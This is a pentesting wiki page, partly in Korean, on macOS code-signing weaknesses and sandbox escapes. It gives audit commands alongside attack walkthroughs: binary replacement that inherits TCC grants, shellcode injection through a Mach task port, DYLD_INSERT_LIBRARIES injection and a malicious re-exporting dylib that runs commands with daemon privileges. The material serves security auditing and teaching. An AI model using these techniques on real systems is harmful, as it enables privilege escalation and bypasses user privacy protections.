# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`)은 인증서 체인 없이 코드 서명을 생성합니다 — 개발자 신원 확인이 없는 코드의 해시입니다. 해당 바이너리의 출처는 어떤 개발자나 조직으로도 추적할 수 없습니다.

Apple Silicon Mac에서는 모든 실행 파일이 최소한 ad-hoc 서명을 필요로 합니다. 따라서 많은 개발 도구, Homebrew 패키지 및 서드파티 유틸리티에서 ad-hoc 서명을 볼 수 있습니다.

### Why This Matters

- **검증 가능한 신원 없음** — 신원 기반 검사로는 바이너리 교체를 탐지하지 못할 수 있습니다
- 권한이 높은 위치에 있는 서드파티 ad-hoc 바이너리 (FDA, daemon, helpers)는 우선 표적이 됩니다
- 일부 구성에서는 ad-hoc 서명이 개발자 서명 코드만큼 **엄격하게 검증되지 않을 수 있습니다**
- **TCC grants**을 가진 ad-hoc 서명 바이너리는 특히 가치가 큽니다 — TCC가 권한을 어떤 키로 관리했는지에 따라 다르지만, 바이너리 내용이 변경되어도 권한 부여가 유지될 수 있습니다

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### 공격: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## 디버깅 가능한 프로세스 (get-task-allow)

### 기본 정보

**`com.apple.security.get-task-allow`** entitlement(또는 `CS_GET_TASK_ALLOW` 플래그)는 **어떤 프로세스든 디버거로 연결될 수 있게 허용**하여 메모리를 읽고, 레지스터를 수정하며, 코드를 주입하고 실행을 제어할 수 있게 합니다.

이는 **오직 개발 빌드용으로만** 의도되었습니다. 그러나 일부 타사 바이너리는 프로덕션에서 이 권한을 포함해 배포됩니다.

> [!CAUTION]
> 프로덕션 바이너리에 `get-task-allow`가 설정되어 있으면 **instant exploitation primitive**입니다. 어떤 로컬 프로세스든 `task_for_pid()`를 호출해 대상의 Mach task port를 얻고, 대상의 entitlements, TCC grants, 및 security context로 실행되는 임의의 코드를 주입할 수 있습니다.

### 발견
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## 라이브러리 검증 비활성화 + DYLD 환경

### 치명적인 조합

바이너리에 **둘 다** 존재할 때:
- `com.apple.security.cs.disable-library-validation` (임의의 dylib을 로드함)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD 환경 변수를 허용함)

이는 **guaranteed code injection primitive** — `DYLD_INSERT_LIBRARIES`가 완벽하게 작동함.

### 발견
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### 공격: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Temporary Exceptions

### How They Weaken the Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`)은 App Sandbox에 구멍을 낸다:

| Exception | What It Allows |
|---|---|
| `temporary-exception.mach-lookup.global-name` | 시스템 전체 XPC/Mach 서비스에 연결 |
| `temporary-exception.files.absolute-path.read-write` | 앱 컨테이너 외부의 파일을 읽고/쓰기 |
| `temporary-exception.iokit-user-client-class` | IOKit user-client 연결 열기 |
| `temporary-exception.shared-preference.read-only` | 다른 앱의 환경설정 읽기 |
| `temporary-exception.files.home-relative-path.read-write` | `~` 기준 경로에 접근 |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

가장 위험한 예외는 **mach-lookup** — 샌드박스화된 앱이 권한 있는 데몬과 통신할 수 있게 한다:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 공격: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## 비공개 Apple 권한

### 개요

`com.apple.private.*`로 시작하는 엔타이틀먼트는 타사 개발자에게 문서화되거나 제공되지 않는 **Apple 내부 API**에 대한 접근을 제공합니다. 타사 바이너리가 비공개 엔타이틀먼트를 가진 경우, 이는 엔터프라이즈 인증서, MDM 또는 App Store 이외의 배포를 통해 획득한 것입니다.

### 위험한 비공개 엔타이틀먼트

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | TCC 데이터베이스 전체 읽기/쓰기 |
| `com.apple.private.tcc.allow` | 특정 TCC 서비스 접근 |
| `com.apple.private.security.no-sandbox` | 샌드박스 없이 실행 |
| `com.apple.private.iokit` | IOKit 드라이버 직접 접근 |
| `com.apple.private.kernel.*` | 커널 인터페이스 접근 |
| `com.apple.private.xpc.launchd.job-label` | launchd 작업 등록/관리 |
| `com.apple.rootless.install` | SIP로 보호된 경로에 쓰기 |

### 발견
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### 무엇인지

Binaries는 SBPL (Seatbelt Profile Language)로 작성된 **custom sandbox profiles**를 함께 배포할 수 있습니다. 이러한 프로파일은 기본 App Sandbox보다 더 제약적일 수도 있고, 기본 App Sandbox보다 **더 관대할 수도 있습니다**.

### 커스텀 프로파일 감사
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 쓰기 가능한 라이브러리 경로

### 개요

현재 사용자가 **쓰기 가능한** 경로에서 binary가 dynamic library를 로드하면, 해당 라이브러리는 악성 코드로 교체될 수 있습니다.

### 탐지
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### 공격: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## 참고자료

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
